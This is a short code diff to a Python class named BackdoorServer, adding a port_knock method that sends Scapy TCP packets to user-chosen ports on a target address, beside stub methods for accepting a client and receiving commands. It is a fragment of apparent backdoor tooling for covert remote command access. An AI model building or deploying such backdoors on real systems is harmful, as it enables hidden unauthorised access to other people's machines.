@@ -59,6 +59,12 @@ class BackdoorServer(object):
         """Listens for a client and stores its IP address (as a string) in self.client on receiving a connection."""
         raise NotImplementedError
 
+    def port_knock(self, ip_addr, knocked_ports):
+        """Knock on ports decided by user"""
+        for port in knocked_ports:
+            send(IP(dst=ip_addr)/TCP(dport=port),verbose=0)
+        
+
     def recv_command(self):
         """Receives and deserialises the next command from the connected client.
         
